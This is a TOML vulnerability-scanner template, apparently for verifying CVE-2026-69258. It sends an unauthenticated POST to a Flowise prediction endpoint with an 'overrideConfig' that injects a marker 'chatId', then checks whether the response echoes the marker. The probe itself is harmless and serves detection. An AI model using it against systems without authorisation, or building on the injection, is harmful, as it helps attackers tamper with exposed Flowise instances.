[info]
author = "ave"
description = "PoC/EXP for verification"
id = "POC-AVE-2026-1349"
name = "FlowiseAI Flowise Unauthenticated Property Injection PoC"
severity = "high"
tags = ["ave-2026-1349"]
vuln_id = [
    "CVE-2026-69258",
    "AVE-2026-1349",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/api/v1/prediction/{{chatflowId}}"
protocol = "http"

[poc.requests.body]
content = """
{
  "question": "POC",
  "overrideConfig": {
    "chatId": "AVE_POC_1349"
  }
}"""
type = "json"

[poc.requests.headers]
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_POC_1349"]
